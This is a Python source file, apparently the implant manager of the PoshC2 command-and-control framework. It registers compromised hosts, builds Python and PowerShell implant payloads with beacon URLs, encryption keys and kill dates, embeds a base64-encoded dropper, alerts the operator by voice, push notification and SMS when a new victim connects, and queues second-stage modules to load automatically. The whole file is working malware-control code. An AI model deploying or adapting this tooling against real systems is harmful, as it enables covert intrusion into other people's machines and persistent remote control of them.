#!/usr/bin/env python

from Colours import Colours
from Utils import randomuri, gen_key  
from Config import PayloadsDirectory, FilesDirectory, Jitter, EnableNotifications, APIKEY, APIToken, APIUser, Sounds, MobileNumber, NotificationsProjectName
from DB import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns
from Core import get_images

import urllib2, base64, datetime

class Implant(object):

  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
    self.RandomURI = randomuri()
    self.Label = None
    self.User = user
    self.Hostname = hostname
    self.IPAddress = ipaddress
    self.Key = gen_key()
    self.FirstSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.LastSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.PID = pid
    self.Proxy = proxy
    self.Arch = arch
    self.Domain = domain
    self.DomainFrontHeader = get_dfheader()
    self.Alive = "Yes"
    self.UserAgent = get_defaultuseragent()
    self.Sleep = get_defaultbeacon()
    self.ModsLoaded = ""
    self.Jitter = Jitter
    self.ImplantID = ""
    self.Pivot = pivot
    self.KillDate = get_killdate()
    self.ServerURL = select_item("HostnameIP", "C2Server")
    self.AllBeaconURLs = get_otherbeaconurls()
    self.AllBeaconImages = get_images()
    self.SharpCore = """
RANDOMURI19901%s10991IRUMODNAR
URLS10484390243%s34209348401SLRU
KILLDATE1665%s5661ETADLLIK
SLEEP98001%s10089PEELS
JITTER2025%s5202RETTIJ
NEWKEY8839394%s4939388YEKWEN
IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Jitter, self.Key, self.AllBeaconImages)
    with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
        self.PythonImplant = base64.b64encode(f.read())
    py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
    ps_implant_core = open("%s/Implant-Core.ps1" % FilesDirectory, 'r').read()
    self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs) #Add all db elements def display(self):

  #Add all db elements
  def display(self):
    print Colours.GREEN,""
    it = self.Pivot
    if (it == "OSX"):
      it = "Python"
    print "[%s] New %s implant connected: (uri=%s key=%s)" % (self.ImplantID, it, self.RandomURI, self.Key)
    print "%s | Time:%s | PID:%s | Sleep:%s | %s (%s) | URL:%s" % (self.IPAddress, self.FirstSeen, self.PID, self.Sleep, (self.User+" @ "+self.Hostname), self.Arch, self.Proxy)
    print "",Colours.END

    try:
      if Sounds.lower().strip() == "yes":
        import pyttsx3
        engine = pyttsx3.init()
        rate = engine.getProperty('rate')
        engine.setProperty('voice', "english-us")
        engine.setProperty('rate', rate-30)
        engine.say("Nice, we have an implant")
        engine.runAndWait()
    except Exception as e:
      pass 

    try:

      if EnableNotifications.lower().strip() == "yes":
        import httplib, urllib
        conn = httplib.HTTPSConnection("api.pushover.net:443")
        conn.request("POST", "/1/messages.json",
          urllib.urlencode({
            "token": APIToken,
            "user": APIUser,
            "message": "[%s] - NewImplant: %s @ %s" % (NotificationsProjectName, self.User,self.Hostname),
          }), { "Content-type": "application/x-www-form-urlencoded" })
        conn.getresponse()

      if EnableNotifications.lower().strip() == "yes" and APIKEY and MobileNumber:
        for number in MobileNumber.split(","):
          number = number.replace('"','')
          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=[%s]%%20-%%20NewImplant:%%20%s\\%s @ %s" % (NotificationsProjectName, APIKEY, number, self.Domain,self.User,self.Hostname)
          url = url.replace(" ","+")
          urllib2.urlopen(url)
    except Exception as e:
      print "SMS send error: %s" % e
      
  def save(self):
    self.ImplantID = new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)

  def autoruns(self):
    new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
    update_mods("Stage2-Core.ps1", self.RandomURI)
    result = get_autoruns()
    if result:
      for autorun in result:
        new_task(autorun[1], "autoruns", self.RandomURI)
